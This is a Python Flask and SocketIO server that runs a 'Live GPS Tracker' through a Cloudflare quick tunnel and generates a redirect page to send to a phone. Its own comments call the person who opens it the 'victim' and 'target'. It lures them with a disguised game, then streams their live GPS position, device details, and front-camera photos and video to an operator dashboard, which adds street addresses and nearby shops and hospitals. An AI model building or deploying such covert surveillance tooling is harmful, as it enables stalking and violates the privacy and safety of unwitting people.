# language: Python, file: app.py, target: Windows 11, Python 3.10+
# Live GPS Tracker — Flask + SocketIO + Cloudflare Quick Tunnel

import os
import re
import sys
import json
import time
import signal
import subprocess
import threading
import webbrowser
import urllib.request
import urllib.parse
import math
from datetime import datetime
from pathlib import Path

from flask import Flask, render_template, jsonify
from flask_socketio import SocketIO, emit

try:
    import qrcode
    HAS_QRCODE = True
except ImportError:
    HAS_QRCODE = False



# ─── Configuration ───────────────────────────────────────────────────────────

PORT = 5000
HOST = "0.0.0.0"
SECRET_KEY = os.urandom(24).hex()
BASE_DIR = Path(__file__).parent.resolve()
OUTPUT_DIR = BASE_DIR / "output"
CLOUDFLARED_BIN = "cloudflared"

# ─── Flask + SocketIO Setup ──────────────────────────────────────────────────

app = Flask(__name__)
app.config["SECRET_KEY"] = SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# ─── State ───────────────────────────────────────────────────────────────────

tunnel_url = None
tunnel_process = None
active_mobile = {"sid": None, "connected": False}
last_location = None
location_history = []
target_device_info = {}


# ─── Cloudflare Tunnel Manager ───────────────────────────────────────────────

class TunnelManager:
    URL_PATTERN = re.compile(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com")

    def __init__(self, port: int, binary: str = "cloudflared"):
        self.port = port
        self.binary = binary
        self.process = None
        self.url = None
        self._url_ready = threading.Event()
        self._reader = None

    def _find_binary(self) -> str:
        """Look for cloudflared in PATH or current directory."""
        local_exe = BASE_DIR / "cloudflared.exe"
        if local_exe.exists():
            return str(local_exe)
        return self.binary

    def start(self, timeout: float = 45.0) -> str:
        binary = self._find_binary()
        cmd = [binary, "tunnel", "--url", f"http://localhost:{self.port}"]

        creation_flags = 0
        if os.name == "nt":
            creation_flags = subprocess.CREATE_NO_WINDOW

        try:
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                creationflags=creation_flags,
            )
        except FileNotFoundError:
            print("\n" + "=" * 60)
            print("  ERROR: cloudflared not found!")
            print("=" * 60)
            print()
            print("  Install it using one of these methods:")
            print()
            print("  1. winget install Cloudflare.cloudflared")
            print("  2. Download cloudflared.exe to this folder:")
            print(f"     {BASE_DIR}")
            print("     From: https://github.com/cloudflare/cloudflared/")
            print("           releases/latest/download/")
            print("           cloudflared-windows-amd64.exe")
            print("  3. Run setup.bat (auto-downloads)")
            print()
            print("=" * 60)
            sys.exit(1)

        self._reader = threading.Thread(target=self._scan_stderr, daemon=True)
        self._reader.start()

        print("  Starting Cloudflare tunnel", end="", flush=True)
        waited = 0
        while waited < timeout and not self._url_ready.is_set():
            print(".", end="", flush=True)
            self._url_ready.wait(timeout=2)
            waited += 2
        print()

        if not self._url_ready.is_set() or not self.url:
            self.stop()
            raise TimeoutError("Timed out waiting for Cloudflare tunnel URL.")

        return self.url

    def _scan_stderr(self):
        if not self.process or not self.process.stderr:
            return
        for line in self.process.stderr:
            match = self.URL_PATTERN.search(line)
            if match:
                self.url = match.group(0)
                self._url_ready.set()
            # keep draining stderr to prevent blocking

    def stop(self):
        if self.process and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
        self.process = None


# ─── HTML File Generator ─────────────────────────────────────────────────────

def generate_mobile_file(public_url: str) -> Path:
    """Generate the track_me.html file that redirects mobile to the GPS page."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    mobile_url = f"{public_url}/mobile"
    filepath = OUTPUT_DIR / "track_me.html"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GPS Tracker</title>
    <meta http-equiv="refresh" content="1;url={mobile_url}">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }}
        .container {{
            padding: 2rem;
        }}
        .spinner {{
            width: 50px;
            height: 50px;
            border: 3px solid rgba(0, 240, 255, 0.2);
            border-top-color: #00f0ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 1.5rem;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        h2 {{
            color: #00f0ff;
            margin-bottom: 0.5rem;
            font-size: 1.3rem;
        }}
        p {{
            color: #888;
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
        }}
        a {{
            color: #00f0ff;
            text-decoration: none;
            padding: 0.8rem 2rem;
            border: 1px solid #00f0ff;
            border-radius: 8px;
            display: inline-block;
            transition: all 0.3s;
        }}
        a:hover {{
            background: rgba(0, 240, 255, 0.1);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Connecting to GPS Tracker...</h2>
        <p>Redirecting automatically...</p>
        <a href="{mobile_url}">Tap here if not redirected</a>
    </div>
    <script>
        window.location.replace("{mobile_url}");
    </script>
</body>
</html>"""

    filepath.write_text(html, encoding="utf-8")
    return filepath


# ─── QR Code Generator ───────────────────────────────────────────────────────

def print_qr_code(url: str):
    """Print ASCII QR code to terminal."""
    if not HAS_QRCODE:
        return

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=1,
        border=1,
    )
    qr.add_data(url)
    qr.make(fit=True)

    # ASCII art QR
    matrix = qr.get_matrix()
    for row in matrix:
        line = ""
        for cell in row:
            line += "██" if cell else "  "
        print(f"  {line}")

    # also save as image
    try:
        img = qr.make_image(fill_color="cyan", back_color="#0a0a0f")
        img_path = OUTPUT_DIR / "qr_code.png"
        img.save(str(img_path))
    except Exception:
        pass


# ─── Flask Routes ────────────────────────────────────────────────────────────

@app.route("/")
def dashboard():
    return render_template("dashboard.html")


@app.route("/mobile")
def mobile():
    return render_template("mobile.html", tunnel_url=tunnel_url or "")


@app.route("/status")
def status():
    return jsonify({
        "tunnel_url": tunnel_url,
        "mobile_connected": active_mobile["connected"],
        "last_location": last_location,
        "trail_points": len(location_history),
        "device_info": target_device_info,
    })


# ─── POI & Reverse Geocoding Engine ──────────────────────────────────────────

def haversine_distance(lat1: float, lon1: float, lat2: float, lon2: float) -> int:
    """Calculate distance in meters between two coordinates."""
    R = 6371000
    phi1 = math.radians(lat1)
    phi2 = math.radians(lat2)
    delta_phi = math.radians(lat2 - lat1)
    delta_lambda = math.radians(lon2 - lon1)
    a = math.sin(delta_phi / 2)**2 + math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda / 2)**2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
    return round(R * c)

poi_cache = {}

def get_nearby_poi(lat: float, lng: float) -> list:
    """Find nearby petrol bunks, shops, and hospitals within ~1.5km."""
    cache_key = (round(lat, 3), round(lng, 3))
    if cache_key in poi_cache:
        return poi_cache[cache_key]

    results = []
    delta = 0.015
    min_lon = lng - delta
    max_lon = lng + delta
    min_lat = lat - delta
    max_lat = lat + delta
    viewbox = f"{min_lon:.5f},{max_lat:.5f},{max_lon:.5f},{min_lat:.5f}"

    categories = [
        ("fuel", "petrol", "Petrol Bunk"),
        ("supermarket", "shop", "Supermarket / Shop"),
        ("pharmacy", "medical", "Hospital / Pharmacy"),
    ]

    for query_tag, cat_id, cat_label in categories:
        try:
            url = f"https://nominatim.openstreetmap.org/search?format=json&q={query_tag}&viewbox={viewbox}&bounded=1&limit=5"
            req = urllib.request.Request(url, headers={"User-Agent": "CyberMahiPOI/2.0"})
            with urllib.request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read().decode("utf-8"))
                for item in data:
                    item_lat = float(item.get("lat"))
                    item_lng = float(item.get("lon"))
                    dist = haversine_distance(lat, lng, item_lat, item_lng)
                    name = item.get("name") or item.get("display_name", "").split(",")[0] or cat_label
                    results.append({
                        "id": item.get("place_id"),
                        "name": name,
                        "type": cat_id,
                        "label": cat_label,
                        "full_address": item.get("display_name"),
                        "lat": item_lat,
                        "lng": item_lng,
                        "distance_m": dist,
                        "gmaps_url": f"https://www.google.com/maps/search/?api=1&query={item_lat},{item_lng}",
                    })
        except Exception as e:
            print(f"  [POI {query_tag}] {e}")

    results.sort(key=lambda x: x["distance_m"])
    poi_cache[cache_key] = results[:12]
    return poi_cache[cache_key]

geocode_cache = {}

def reverse_geocode(lat: float, lng: float) -> dict:
    """Reverse geocode coordinates using OSM Nominatim with BigDataCloud fallback."""
    key = (round(lat, 4), round(lng, 4))
    if key in geocode_cache:
        return geocode_cache[key]

    info = {
        "place_name": "Location Acquired",
        "full_address": f"{lat:.6f}, {lng:.6f}",
        "road": "",
        "suburb": "",
        "city": "",
        "state": "",
        "postcode": "",
        "country": "",
        "google_maps_url": f"https://www.google.com/maps/search/?api=1&query={lat},{lng}",
        "google_street_view_url": f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lng}",
        "google_directions_url": f"https://www.google.com/maps/dir/?api=1&destination={lat},{lng}",
    }

    # Primary: OpenStreetMap Nominatim
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}&zoom=18&addressdetails=1"
        req = urllib.request.Request(url, headers={"User-Agent": "CyberMahiGPSRecon/2.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            addr = data.get("address", {})
            road = addr.get("road") or addr.get("pedestrian") or addr.get("street") or ""
            suburb = addr.get("suburb") or addr.get("neighbourhood") or addr.get("village") or addr.get("subdistrict") or ""
            city = addr.get("city") or addr.get("town") or addr.get("county") or addr.get("state_district") or ""
            state = addr.get("state") or ""
            postcode = addr.get("postcode") or ""
            country = addr.get("country") or ""

            place_parts = [p for p in [road, suburb, city] if p]
            place_name = ", ".join(place_parts[:2]) if place_parts else (city or data.get("name") or "Tracked Target")

            info.update({
                "place_name": place_name,
                "full_address": data.get("display_name", f"{lat:.6f}, {lng:.6f}"),
                "road": road,
                "suburb": suburb,
                "city": city,
                "state": state,
                "postcode": postcode,
                "country": country,
            })
            geocode_cache[key] = info
            return info
    except Exception as e:
        print(f"  [Geocode Primary Error] {e}")

    # Fallback: BigDataCloud Reverse Geocode Client API
    try:
        url = f"https://api.bigdatacloud.net/data/reverse-geocode-client?latitude={lat}&longitude={lng}&localityLanguage=en"
        req = urllib.request.Request(url, headers={"User-Agent": "CyberMahiGPSRecon/2.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            city = data.get("city") or data.get("locality") or ""
            state = data.get("principalSubdivision") or ""
            postcode = data.get("postcode") or ""
            country = data.get("countryName") or ""
            locality = data.get("locality") or city

            info.update({
                "place_name": f"{locality}, {state}".strip(", "),
                "full_address": f"{locality}, {city}, {state} {postcode}, {country}".strip(", "),
                "city": city,
                "state": state,
                "postcode": postcode,
                "country": country,
            })
            geocode_cache[key] = info
            return info
    except Exception as e:
        print(f"  [Geocode Fallback Error] {e}")

    return info


# ─── SocketIO Events ─────────────────────────────────────────────────────────

@socketio.on("connect")
def handle_connect():
    print(f"  Client connected: {__import__('flask').request.sid}")


@socketio.on("disconnect")
def handle_disconnect():
    from flask import request
    sid = request.sid
    print(f"  Client disconnected: {sid}")
    if active_mobile["sid"] == sid:
        active_mobile["sid"] = None
        active_mobile["connected"] = False
        emit("mobile_status", {"connected": False}, broadcast=True)


@socketio.on("mobile_ready")
def handle_mobile_ready():
    from flask import request
    sid = request.sid
    active_mobile["sid"] = sid
    active_mobile["connected"] = True
    print(f"  Mobile GPS client ready: {sid}")
    emit("mobile_status", {"connected": True}, broadcast=True)


@socketio.on("game_started")
def handle_game_started(data=None):
    """Triggered when victim taps 'START RACE' on mobile."""
    print("\n  [!] TARGET STARTED GAME! Victim tapped START RACE / OK.")
    # Auto-open dashboard in operator's browser immediately
    try:
        webbrowser.open(f"http://localhost:{PORT}")
    except Exception as e:
        print(f"  Failed to auto-open browser: {e}")

    emit("target_game_started", {
        "timestamp": datetime.now().isoformat(),
        "info": data or {}
    }, broadcast=True)


@socketio.on("device_telemetry")
def handle_device_telemetry(data):
    """Receive rich device hardware, battery, and network telemetry from mobile."""
    global target_device_info
    target_device_info = data or {}
    model = target_device_info.get("model", "Unknown Device")
    net = target_device_info.get("networkType", "Unknown")
    batt = target_device_info.get("battery", "--")
    print(f"  [DEVICE INTEL] Model: {model} | Net: {net} | Battery: {batt}%")
    emit("update_device_telemetry", target_device_info, broadcast=True, include_self=False)


@socketio.on("set_camera_mode")
def handle_set_camera_mode(data):
    """Operator sets mobile camera mode: 'image' or 'video'."""
    mode = data.get("mode", "image") if isinstance(data, dict) else str(data)
    print(f"  [CAMERA CONTROL] Operator switched mode to: {mode}")
    emit("change_camera_mode", {"mode": mode}, broadcast=True)


@socketio.on("send_face_frame")
def handle_face_frame(data):
    """Receive front-camera snapshot/frame from mobile and broadcast to dashboard."""
    # broadcast to dashboard viewers
    emit("update_face_frame", data, broadcast=True, include_self=False)


@socketio.on("send_video_frame")
def handle_video_frame(data):
    """Receive real-time video stream chunk from mobile and broadcast to dashboard."""
    emit("update_video_frame", data, broadcast=True, include_self=False)


@socketio.on("send_location")
def handle_location(data):
    global last_location
    lat = data.get("lat")
    lng = data.get("lng")

    # Reverse geocode place details & nearby POIs (petrol bunks, shops, hospitals)
    geo = {}
    poi = []
    if lat is not None and lng is not None:
        try:
            geo = reverse_geocode(float(lat), float(lng))
        except Exception as e:
            print(f"  Geocode failed: {e}")
        try:
            poi = get_nearby_poi(float(lat), float(lng))
        except Exception as e:
            print(f"  POI search failed: {e}")

    last_location = {
        "lat": lat,
        "lng": lng,
        "accuracy": data.get("accuracy"),
        "speed": data.get("speed"),
        "heading": data.get("heading"),
        "timestamp": data.get("timestamp", datetime.now().isoformat()),
        "geo": geo,
        "poi": poi,
    }
    location_history.append(last_location)

    # Print clean real-time status in console
    place_str = geo.get("place_name") or f"{lat:.6f}, {lng:.6f}"
    poi_count = len(poi)
    print(f"  [TARGET GPS] {lat:.6f}, {lng:.6f} | {place_str} | POIs Nearby: {poi_count} | Speed: {data.get('speed') or 0} m/s")

    # broadcast to dashboard viewers
    emit("update_location", last_location, broadcast=True, include_self=False)


@socketio.on("stop_sharing")
def handle_stop():
    from flask import request
    sid = request.sid
    if active_mobile["sid"] == sid:
        active_mobile["connected"] = False
        emit("mobile_status", {"connected": False}, broadcast=True)
        print(f"  Mobile stopped sharing: {sid}")


# ─── Startup Banner ──────────────────────────────────────────────────────────

BANNER = r"""
  ╔══════════════════════════════════════════════════╗
  ║           LIVE GPS TRACKER                       ║
  ║           ━━━━━━━━━━━━━━━━                       ║
  ║           Cloudflare Tunnel Edition               ║
  ╚══════════════════════════════════════════════════╝
"""

def print_startup_info(public_url: str, file_path: Path):
    mobile_url = f"{public_url}/mobile"
    print(BANNER)
    print(f"  Dashboard  :  http://localhost:{PORT}")
    print(f"  Public URL :  {public_url}")
    print(f"  Mobile URL :  {mobile_url}")
    print(f"  HTML File  :  {file_path}")
    print()

    if HAS_QRCODE:
        print("  ── Scan QR Code on Mobile ──")
        print()
        print_qr_code(mobile_url)
        print()

    print("  ── Instructions ──")
    print(f"  1. Open dashboard: http://localhost:{PORT}")
    print(f"  2. Send '{file_path.name}' to your phone")
    print(f"     (or scan the QR code above)")
    print(f"  3. Open it on your phone and allow location")
    print(f"  4. Watch live tracking on the dashboard!")
    print()
    print("  Press Ctrl+C to stop.")
    print("  " + "─" * 48)


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    global tunnel_url, tunnel_process

    OUTPUT_DIR.mkdir(exist_ok=True)

    # start cloudflare tunnel
    manager = TunnelManager(PORT, CLOUDFLARED_BIN)
    try:
        tunnel_url = manager.start(timeout=45)
    except TimeoutError:
        print("\n  ERROR: Could not establish Cloudflare tunnel.")
        print("  Check your internet connection and try again.")
        sys.exit(1)
    except Exception as e:
        print(f"\n  ERROR: {e}")
        sys.exit(1)

    tunnel_process = manager

    # generate mobile HTML file
    file_path = generate_mobile_file(tunnel_url)

    # show startup info
    print_startup_info(tunnel_url, file_path)

    # open dashboard in default browser
    webbrowser.open(f"http://localhost:{PORT}")

    # handle graceful shutdown
    def shutdown_handler(signum, frame):
        print("\n\n  Shutting down...")
        manager.stop()
        print("  Tunnel closed. Goodbye!")
        sys.exit(0)

    signal.signal(signal.SIGINT, shutdown_handler)
    signal.signal(signal.SIGTERM, shutdown_handler)

    # start the server
    try:
        socketio.run(
            app,
            host=HOST,
            port=PORT,
            debug=False,
            use_reloader=False,
            allow_unsafe_werkzeug=True,
        )
    finally:
        manager.stop()


if __name__ == "__main__":
    main()
